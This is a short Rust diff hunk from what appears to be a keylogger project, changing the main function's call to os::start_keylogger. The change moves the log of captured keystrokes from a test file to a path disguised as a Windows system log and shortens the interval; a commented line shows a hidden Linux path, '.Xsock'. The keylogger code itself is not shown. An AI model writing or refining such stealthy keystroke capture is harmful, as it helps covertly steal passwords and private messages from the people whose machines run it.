@@ -20,5 +20,5 @@ struct Args {
 
 fn main() {
     // let _res = os::start_keylogger("/var/lib/.Xsock".to_owned(), 10);
-    let _res = os::start_keylogger("C:\\ProgramData\\test.txt".to_owned(), 10);
+    let _res = os::start_keylogger("C:\\Windows\\Logs\\SIH\\SIH.20240307.162282.822.1".to_owned(), 2);
 }
